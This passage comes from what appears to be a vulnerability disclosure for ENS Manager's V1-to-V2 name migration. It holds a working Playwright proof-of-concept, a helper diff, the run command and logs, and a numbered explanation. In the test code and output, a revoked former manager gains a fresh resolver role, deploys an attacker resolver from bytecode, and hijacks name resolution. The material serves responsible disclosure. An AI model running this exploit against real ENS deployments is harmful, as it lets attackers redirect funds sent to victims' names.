          data: encodeFunctionData({
            abi:
              V1_ENS_REGISTRY_ABI,
            functionName:
              'setOwner',
            args: [
              node,
              formerManager.address,
            ],
          }),
        })

        const managerBeforePreview =
          await publicClient
            .readContract({
              address:
                V1_ENS_REGISTRY,
              abi:
                V1_ENS_REGISTRY_ABI,
              functionName:
                'owner',
              args: [node],
            })

        expect(
          managerBeforePreview
            .toLowerCase(),
        ).toBe(
          formerManager.address
            .toLowerCase(),
        )

        console.log(
          '[M1] V1 manager BEFORE preview =',
          managerBeforePreview,
        )

        // Prove C has no pre-existing destination authority.
        const cRolesInitially =
          await publicClient
            .readContract({
              address:
                V2_ETH_REGISTRY,
              abi:
                V2_ETH_REGISTRY_ABI,
              functionName:
                'roles',
              args: [
                resource,
                formerManager.address,
              ],
            })

        console.log(
          '[M1] C V2 roles BEFORE migration = 0x' +
            cRolesInitially.toString(
              16,
            ),
        )

        expect(
          cRolesInitially,
        ).toBe(0n)

        // ----------------------------------------------------------
        // STEP 3 — truthful V1 source reports manager C.
        // ----------------------------------------------------------

        const mockedName:
          MockV1Name = {
            name: v1Name,
            ownerAddress:
              victim.address,
            managerAddress:
              formerManager.address,
            type: 'unwrapped',
          }

        const v1RequestBodies:
          string[] = []

        page.on(
          'request',
          (request) => {
            if (
              !request
                .url()
                .includes(
                  'v1-graphql.ens.dev/subgraph',
                )
            ) {
              return
            }

            const body =
              request.postData()

            if (body) {
              v1RequestBodies
                .push(
                  body,
                )
            }
          },
        )

        await mockV1Subgraph(
          page,
          [mockedName],
        )

        const finalUpgrade =
          await prepareMigrationPlan(
            page,
          )

        console.log(
          '[M1] migration plan prepared while current V1 manager = C',
        )

        console.log(
          '[M1] captured V1 GraphQL request bodies =',
          v1RequestBodies.length,
        )

        expect(
          v1RequestBodies.length,
        ).toBeGreaterThan(0)

        // ----------------------------------------------------------
        // STEP 4 — before final confirmation, A reclaims V1.
        // ----------------------------------------------------------

        await sendAndWait({
          account: victim,
          to:
            V1_BASE_REGISTRAR,
          what:
            'A executes BaseRegistrar.reclaim(C -> A)',
          data: encodeFunctionData({
            abi:
              V1_BASE_REGISTRAR_ABI,
            functionName:
              'reclaim',
            args: [
              v1TokenId,
              victim.address,
            ],
          }),
        })

        const managerAfterReclaim =
          await publicClient
            .readContract({
              address:
                V1_ENS_REGISTRY,
              abi:
                V1_ENS_REGISTRY_ABI,
              functionName:
                'owner',
              args: [node],
            })

        console.log(
          '[M1] V1 manager AFTER reclaim =',
          managerAfterReclaim,
        )

        expect(
          managerAfterReclaim
            .toLowerCase(),
        ).toBe(
          victim.address
            .toLowerCase(),
        )

        expect(
          managerAfterReclaim
            .toLowerCase(),
        ).not.toBe(
          formerManager.address
            .toLowerCase(),
        )

        // ----------------------------------------------------------
        // STEP 5 — prove C actually lost V1 authority.
        // ----------------------------------------------------------

        let cCanMutateV1 = true

        try {
          await publicClient.call({
            account:
              formerManager.address,
            to:
              V1_ENS_REGISTRY,
            data:
              encodeFunctionData({
                abi:
                  V1_ENS_REGISTRY_ABI,
                functionName:
                  'setOwner',
                args: [
                  node,
                  formerManager.address,
                ],
              }),
          })
        } catch {
          cCanMutateV1 = false
        }

        console.log(
          '[M1] C can mutate V1 after reclaim =',
          cCanMutateV1,
        )

        expect(
          cCanMutateV1,
        ).toBe(false)

        // ----------------------------------------------------------
        // STEP 6 — external V1 source is current, and the actual HTTP
        // response served to the browser reports A before final Upgrade.
        // ----------------------------------------------------------

        // Keep the mocked source truthful after the canonical reclaim().
        mockedName.managerAddress =
          victim.address

        // Reuse the exact getNamesForAddress request body Manager emitted while
        // preparing the migration. This proves the browser-visible source has
        // caught up even though the already-prepared migration plan has not.
        const capturedNamesRequestBody =
          v1RequestBodies.find(
            (body) =>
              body.includes(
                'getNamesForAddress',
              ),
          )

        if (!capturedNamesRequestBody) {
          throw new Error(
            'No captured getNamesForAddress V1 GraphQL request was available for replay',
          )
        }

        // IMPORTANT: replay through page.evaluate(fetch), not page.request.
        // page.route() only intercepts browser traffic, and we want to inspect
        // the exact HTTP JSON the Manager browser can currently receive.
        const actualV1HttpJson =
          await page.evaluate(
            async ({
              url,
              body,
            }) => {
              const response =
                await fetch(
                  url,
                  {
                    method:
                      'POST',
                    headers: {
                      'content-type':
                        'application/json',
                    },
                    body,
                  },
                )

              if (!response.ok) {
                throw new Error(
                  `V1 GraphQL replay failed: ${response.status} ${response.statusText}`,
                )
              }

              return response.json()
            },
            {
              url:
                V1_SUBGRAPH_HTTP_URL,
              body:
                capturedNamesRequestBody,
            },
          )

        const actualServedOwnerId =
          findServedV1OwnerId(
            actualV1HttpJson,
            v1Name,
          )

        console.log(
          '[M1] OBSERVED actual V1 HTTP response owner.id AFTER reclaim =',
        )
        console.log(
          actualServedOwnerId,
        )

        expect(
          actualServedOwnerId,
        ).not.toBeNull()

        expect(
          actualServedOwnerId
            ?.toLowerCase(),
        ).toBe(
          victim.address
            .toLowerCase(),
        )

        console.log(
          '[M1] ✅ actual served V1 payload reports A BEFORE final Upgrade click',
        )

        console.log(
          '[M1] ✅ C was fully evicted BEFORE victim final confirmation',
        )

        // ----------------------------------------------------------
        // STEP 7 — victim confirms the already-prepared migration.
        // ----------------------------------------------------------

        await executePreparedMigration(
          page,
          wallet,
          finalUpgrade,
        )

        // ----------------------------------------------------------
        // STEP 8 — decisive root-cause assertion.
        // ----------------------------------------------------------

        const formerManagerRoles =
          await publicClient
            .readContract({
              address:
                V2_ETH_REGISTRY,
              abi:
                V2_ETH_REGISTRY_ABI,
              functionName:
                'roles',
              args: [
                resource,
                formerManager.address,
              ],
            })

        const victimRoles =
          await publicClient
            .readContract({
              address:
                V2_ETH_REGISTRY,
              abi:
                V2_ETH_REGISTRY_ABI,
              functionName:
                'roles',
              args: [
                resource,
                victim.address,
              ],
            })

        const v2TokenId =
          await getTokenId(
            publicClient,
            {
              label,
              registryAddress:
                V2_ETH_REGISTRY,
            },
          )

        const victimBalanceAfterMigration =
          await publicClient
            .readContract({
              address:
                V2_ETH_REGISTRY,
              abi:
                erc1155Abi,
              functionName:
                'balanceOf',
              args: [
                victim.address,
                v2TokenId,
              ],
            })

        console.log('')
        console.log(
          '=== POST-MIGRATION AUTHORITY ===',
        )

        console.log(
          '[M1] V1 BaseRegistrar tokenId =',
          v1TokenId.toString(),
        )

        console.log(
          '[M1] V2 ERC1155 tokenId =',
          v2TokenId.toString(),
        )

        console.log(
          '[M1] victim V2 ERC1155 balance after migration =',
          victimBalanceAfterMigration.toString(),
        )

        console.log(
          '[M1] V2 former-manager roles = 0x' +
            formerManagerRoles.toString(
              16,
            ),
        )

        console.log(
          '[M1] V2 victim roles = 0x' +
            victimRoles.toString(
              16,
            ),
        )

        const staleGrantExists =
          (
            formerManagerRoles &
            ROLE_SET_RESOLVER
          ) ===
          ROLE_SET_RESOLVER

        const victimCanRevoke =
          (
            victimRoles &
            ROLE_SET_RESOLVER_ADMIN
          ) ===
          ROLE_SET_RESOLVER_ADMIN

        console.log(
          '[M1] C has fresh V2 ROLE_SET_RESOLVER =',
          staleGrantExists,
        )

        console.log(
          '[M1] A has ROLE_SET_RESOLVER_ADMIN =',
          victimCanRevoke,
        )

        expect(
          victimBalanceAfterMigration,
        ).toBe(1n)

        expect(
          staleGrantExists,
        ).toBe(true)

        // Explicitly acknowledge revocability.
        expect(
          victimCanRevoke,
        ).toBe(true)

        console.log('')
        console.log(
          '🚨 [M1] UNAUTHORIZED V2 ROLE GRANT CONFIRMED',
        )

        // ----------------------------------------------------------
        // STEP 9 — C deploys a real attacker resolver transaction.
        // ----------------------------------------------------------

        const attackerRuntime:
          Hex =
          `0x73${formerManager.address.slice(
            2,
          )}60005260206000f3`

        // Runtime length is 0x1d bytes.
        const attackerCreationCode:
          Hex =
          `0x601d600c600039601d6000f3${attackerRuntime.slice(
            2,
          )}`

        const deploymentHash =
          await walletClient
            .sendTransaction({
              account:
                formerManager,
              data:
                attackerCreationCode,
            })

        const deploymentReceipt =
          await publicClient
            .waitForTransactionReceipt({
              hash:
                deploymentHash,
            })

        console.log(
          '[M1 tx] C deploys attacker resolver:',
          deploymentHash,
          `status=${deploymentReceipt.status}`,
        )

        expect(
          deploymentReceipt.status,
        ).toBe('success')

        const attackerResolver =
          deploymentReceipt
            .contractAddress

        if (!attackerResolver) {
          throw new Error(
            'attacker resolver deployment returned no contract address',
          )
        }

        console.log(
          '[M1] attacker resolver deployed at =',
          attackerResolver,
        )

        const attackerCode =
          await publicClient
            .getCode({
              address:
                attackerResolver,
            })

        expect(
          attackerCode?.toLowerCase(),
        ).toBe(
          attackerRuntime.toLowerCase(),
        )

        // ----------------------------------------------------------
        // STEP 10 — C consumes the resurrected permission.
        // ----------------------------------------------------------

        await sendAndWait({
          account:
            formerManager,
          to:
            V2_ETH_REGISTRY,
          what:
            'C replaces victim V2 resolver',
          data:
            encodeFunctionData({
              abi:
                V2_ETH_REGISTRY_ABI,
              functionName:
                'setResolver',
              args: [
                resource,
                attackerResolver,
              ],
            }),
        })

        const resolverAfterAttack =
          await publicClient
            .readContract({
              address:
                V2_ETH_REGISTRY,
              abi:
                V2_ETH_REGISTRY_ABI,
              functionName:
                'getResolver',
              args: [label],
            })

        console.log(
          '[M1] resolver after attack =',
          resolverAfterAttack,
        )

        expect(
          resolverAfterAttack
            .toLowerCase(),
        ).toBe(
          attackerResolver
            .toLowerCase(),
        )

        // ----------------------------------------------------------
        // STEP 11 — concrete Critical impact.
        // ----------------------------------------------------------

        const resolvedAddress =
          await publicClient
            .readContract({
              address:
                attackerResolver,
              abi:
                ATTACKER_RESOLVER_ABI,
              functionName:
                'addr',
              args: [node],
            })

        console.log(
          `[M1] ${v1Name} resolves to =`,
          resolvedAddress,
        )

        expect(
          resolvedAddress
            .toLowerCase(),
        ).toBe(
          formerManager.address
            .toLowerCase(),
        )

        const victimBalanceAfterAttack =
          await publicClient
            .readContract({
              address:
                V2_ETH_REGISTRY,
              abi:
                erc1155Abi,
              functionName:
                'balanceOf',
              args: [
                victim.address,
                v2TokenId,
              ],
            })

        expect(
          victimBalanceAfterAttack,
        ).toBe(1n)

        console.log(
          '[M1] victim V2 ERC1155 balance after resolver hijack =',
          victimBalanceAfterAttack.toString(),
        )

        console.log('')
        console.log(
          '============================================================',
        )
        console.log(
          '🚨 M1 E2E VULNERABILITY CONFIRMED',
        )
        console.log(
          '============================================================',
        )
        console.log(
          'A reclaimed the V1 node before final migration confirmation.',
        )
        console.log(
          'The ACTUAL served V1 HTTP payload reported A before final Upgrade.',
        )
        console.log(
          'C had zero V1 authority and zero V2 roles at that point.',
        )
        console.log(
          'Manager still granted C fresh V2 ROLE_SET_RESOLVER.',
        )
        console.log(
          'C deployed an attacker resolver using a real transaction.',
        )
        console.log(
          'C successfully replaced the victim resolver.',
        )
        console.log(
          'The migrated victim name now resolves to C.',
        )
        console.log(
          'A remains the actual V2 token owner.',
        )
        console.log(
          '============================================================',
        )
      },
    )
  },
)
```

### Supporting V1-subgraph helper change

I observed that the existing V1 E2E mock normally assumes the registrant and ENS Registry manager are the same EOA. To reproduce this issue accurately, I extended the PoC so it can model the real V1 state where those identities differ.

I used the following minimal helper extension:

```diff
diff --git a/e2e/helpers/mock-v1-subgraph.ts b/e2e/helpers/mock-v1-subgraph.ts
--- a/e2e/helpers/mock-v1-subgraph.ts
+++ b/e2e/helpers/mock-v1-subgraph.ts
@@
 function buildV1Domain(params: {
   label: string
   ownerAddress: string
+  /** Optional V1 ENS Registry owner/controller. Defaults to ownerAddress. */
+  managerAddress?: string
   type?: V1NameType
   hasRecords?: boolean
   fuses?: number
@@
   const {
     label,
     ownerAddress,
+    managerAddress,
     type = 'unwrapped',
@@
   const owner = ownerAddress.toLowerCase()
+  const manager = (managerAddress ?? ownerAddress).toLowerCase()
@@
     owner: {
       id: isWrapped
         ? '0x0635513f179D50A207757E05759CbD106d7dFcE8'
-        : owner,
+        : manager,
     },
@@
 export type MockV1Name = {
   name: string
   ownerAddress: string
+  managerAddress?: string
   type?: V1NameType
@@
       return buildV1Domain({
         label,
         ownerAddress: n.ownerAddress,
+        managerAddress: n.managerAddress,
         type: n.type,
```

In my successful local run, I used the current V1 subgraph endpoint:

```
v1-graphql.ens.dev/subgraph
```

I also used the canonical V1 PublicResolver from the frozen Manager migration environment:

```
0x8FADE66B79cC9f707aB26799354482EB93a5B7dD
```

### Isolated Playwright configuration

```ts
import { defineConfig } from '@playwright/test'
import { baseConfig } from '../../playwright.config.base.js'

export default defineConfig({
  ...baseConfig,

  timeout: 360_000,

  testDir: './tests',

  use: {
    ...baseConfig.use,
    baseURL:
      process.env.MANAGER_APP_URL ??
      'http://localhost:3000',
  },

  projects: [
    {
      name:
        'stale-manager-role-grant-e2e',
      testMatch:
        /stale-manager-role-grant\.poc\.spec\.ts$/,
    },
  ],
})
```

## Command

I ran the final hardened E2E against Manager on `127.0.0.1:3000` and the local Sepolia/Anvil E2E infrastructure on `127.0.0.1:8545`:

```bash
cd /workspaces/ens-wrapper-retention-poc
nvm use 22
export PATH="$HOME/.foundry/bin:$PATH"

export MANAGER_APP_URL=http://127.0.0.1:3000
export ANVIL_RPC_URL=http://127.0.0.1:8545
export E2E_MOCK_INDEXER=true

rm -f m1-final-e2e-v4.log

set -o pipefail

pnpm --filter @ens-apps/e2e exec playwright test \
  --config=projects/manager/playwright.stale-manager-poc.config.ts \
  stale-manager-role-grant.poc.spec.ts \
  --workers=1 \
  --retries=0 \
  --reporter=line \
  2>&1 | tee m1-final-e2e-v4.log
```

The test completed with `1 passed (1.1m)`.

## Observed Output

Relevant output from the fresh successful hardened run:

```
[mock-indexer] E2E_MOCK_INDEXER=true — intercepting indexer requests
[manager-auth] BackendAuthModal visible — clicking "Skip for now"
[manager-auth] BackendAuthModal dismissed

============================================================
M1 E2E: stale V1 manager resurrection
============================================================
[M1] V2 ETHRegistry = 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
[M1] victim A       = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
[M1] former manager C = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

[makeV1Name] registering V1 name m1-stale-manager-final-1788325410.eth (duration=31536000s, type=unwrapped)
[makeV1Name] live BaseRegistrar owner=0x4ad56feb5Fc7B8298db06E88fd5CBc41D64602Fa
[makeV1Name] temporarily authorizing 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 as V1 controller
[makeV1Name] tx 0x46d6b139b1015de515954d058ff0c73e1e2a5df275086871d022a0e1842f746b status=success block=11617267
[makeV1Name] ✅ local historical BaseRegistrar controller ready
[makeV1Name] tx 0xac525b16ce8d7e2d5cab577f28aef71a5f1337973615b96f281526b64751be5b status=success block=11617268
[makeV1Name] ✅ canonical V1 ERC721 registered to 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
[reserveInV2] reserving m1-stale-manager-final-1788325410.eth in V2 (expiry=1819861409)
[makeV1Name] tx 0xd8a1c685c55cea9e15f8cb0a0a47f1e755a1f2a86a88c3179028e96959b6cc35 status=success block=11617269
[reserveInV2] ✅ m1-stale-manager-final-1788325410.eth RESERVED in V2
[makeV1Name] ✅ m1-stale-manager-final-1788325410.eth (type: unwrapped, owner: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266)

[M1] name = m1-stale-manager-final-1788325410.eth
[M1] resource = 64093525780458637063113775883054915853164444040013489108617653370664354054144

[M1 tx] A assigns C as V1 ENS Registry manager:
0x4f15005b05637149eeb14bbbea2a637aad4c5593f4be763d7bbac35e7c7db088
status=success

[M1] V1 manager BEFORE preview =
0x70997970C51812dc3A010C7d01b50e0d17dc79C8

[M1] C V2 roles BEFORE migration = 0x0

[mock-v1-subgraph] Injecting 1 mock V1 names (m1-stale-manager-final-1788325410.eth) into subgraph response (0 real names)

[M1] ✅ migration preview fully prepared
[M1] migration plan prepared while current V1 manager = C
[M1] captured V1 GraphQL request bodies = 2

[M1 tx] A executes BaseRegistrar.reclaim(C -> A):
0x6899750bc1468f226ecff231d842429feb3fc084a6b5e4d21c4debe827f8a410
status=success

[M1] V1 manager AFTER reclaim =
0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

[M1] C can mutate V1 after reclaim = false

[mock-v1-subgraph] Injecting 1 mock V1 names (m1-stale-manager-final-1788325410.eth) into subgraph response (0 real names)

[M1] OBSERVED actual V1 HTTP response owner.id AFTER reclaim =
0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266

[M1] ✅ actual served V1 payload reports A BEFORE final Upgrade click
[M1] ✅ C was fully evicted BEFORE victim final confirmation

[M1] victim clicks final Upgrade button
[M1] ✅ Manager reports migration completed

=== POST-MIGRATION AUTHORITY ===
[M1] V1 BaseRegistrar tokenId =
64093525780458637063113775883054915853164444040013489108617653370668605467925

[M1] V2 ERC1155 tokenId =
64093525780458637063113775883054915853164444040013489108617653370664354054145

[M1] victim V2 ERC1155 balance after migration = 1
[M1] V2 former-manager roles = 0x1000000
[M1] V2 victim roles = 0x1110000000000000000000000000000101100000
[M1] C has fresh V2 ROLE_SET_RESOLVER = true
[M1] A has ROLE_SET_RESOLVER_ADMIN = true

🚨 [M1] UNAUTHORIZED V2 ROLE GRANT CONFIRMED

[M1 tx] C deploys attacker resolver:
0xbc926259f20e7c514a769a59d437843171320bd44ff4d5bdcd107ac7d12ace43
status=success

[M1] attacker resolver deployed at =
0xd98394c99151e9f7479447a52b6c4ecc521eb467

[M1 tx] C replaces victim V2 resolver:
0x376e41a48158c0aa0574e903dff98a596073594f73e0a9c6e3b6aab3a89ba915
status=success

[M1] resolver after attack =
0xD98394c99151E9F7479447A52B6c4ECC521eb467

[M1] m1-stale-manager-final-1788325410.eth resolves to =
0x70997970C51812dc3A010C7d01b50e0d17dc79C8

[M1] victim V2 ERC1155 balance after resolver hijack = 1

============================================================
🚨 M1 E2E VULNERABILITY CONFIRMED
============================================================
A reclaimed the V1 node before final migration confirmation.
The ACTUAL served V1 HTTP payload reported A before final Upgrade.
C had zero V1 authority and zero V2 roles at that point.
Manager still granted C fresh V2 ROLE_SET_RESOLVER.
C deployed an attacker resolver using a real transaction.
C successfully replaced the victim resolver.
The migrated victim name now resolves to C.
A remains the actual V2 token owner.
============================================================

1 passed (1.1m)
```

The decisive ordering is:

```
V1 manager AFTER reclaim = A
C can mutate V1 after reclaim = false
actual served V1 HTTP owner.id = A
actual served payload reports A BEFORE final Upgrade
victim clicks final Upgrade
Manager completes migration
C V2 roles = 0x1000000
C uses role to replace resolver
victim.eth resolves to C
victim remains ERC1155 owner
```

## What the PoC Proves

1. A real historical unwrapped V1 `.eth` name was created for victim `A`, with `C` set as its genuine V1 ENS Registry manager.
2. Before migration planning, direct chain reads confirmed:
   * V1 manager = `C`
   * `C` V2 roles = `0x0`
3. The real Manager UI then fully prepared the V1→V2 migration while `C` was still the legitimate V1 manager.
4. During that planning step, the exact V1 GraphQL request bodies used by Manager were captured.
5. Before the victim clicked the final **Upgrade** button, `A` executed the canonical `BaseRegistrar.reclaim()` operation.
6. Direct V1 chain reads then showed:

   * `ENSRegistry.owner(node) = A`
   * a mutation attempt from `C` failed

   This confirms that `C` had genuinely lost V1 manager authority.
7. The V1 source was updated to the current safe state, and the previously captured GraphQL request was replayed through the browser.
8. The actual HTTP response returned to the browser was inspected, and the target name reported:

   ```
   owner.id = A
   ```

   This assertion succeeded **before** the final migration confirmation.
9. The victim then continued the normal Manager migration flow, and Manager reported the migration as successfully completed.
10. Post-migration chain reads showed:

    ```
    victim V2 ERC1155 balance = 1
    C V2 roles                = 0x1000000
    ```

    `0x1000000` contains `ROLE_SET_RESOLVER`, proving that migration created fresh resolver authority for the already-revoked manager.
11. The victim separately received `ROLE_SET_RESOLVER_ADMIN`, so the PoC does not claim permanent takeover.
12. Using only the newly-created role, `C` successfully:
    * deployed an attacker-controlled resolver;
    * called the real V2 `ETHRegistry.setResolver()`; and
    * replaced the victim name's resolver.
13. Calling the new resolver showed that the migrated victim name resolved to `C`:

    ```
    m1-stale-manager-final-1788325410.eth
    ->
    0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    ```
14. The victim's V2 ERC-1155 balance remained `1` after the resolver hijack, confirming that ownership stayed with `A` while unauthorized resolver authority was exercised.
15. The final hardened Playwright E2E completed successfully:

    ```
    1 passed
    ```

The key invariant violation demonstrated by the PoC is:

```
before final confirmation:
C has no V1 authority
C has no V2 authority
actual served V1 HTTP owner.id = A

after Manager migration:
C receives ROLE_SET_RESOLVER

C then exercises that fresh role:
setResolver(attackerResolver) = success
victim.eth resolves to C

A remains the legitimate V2 owner
```

This finding is therefore an **in-scope Manager V1→V2 migration authorization vulnerability in which an already-revoked V1 manager is resurrected with fresh V2 resolver authority and can immediately redirect resolution of the victim's migrated ENS name**.
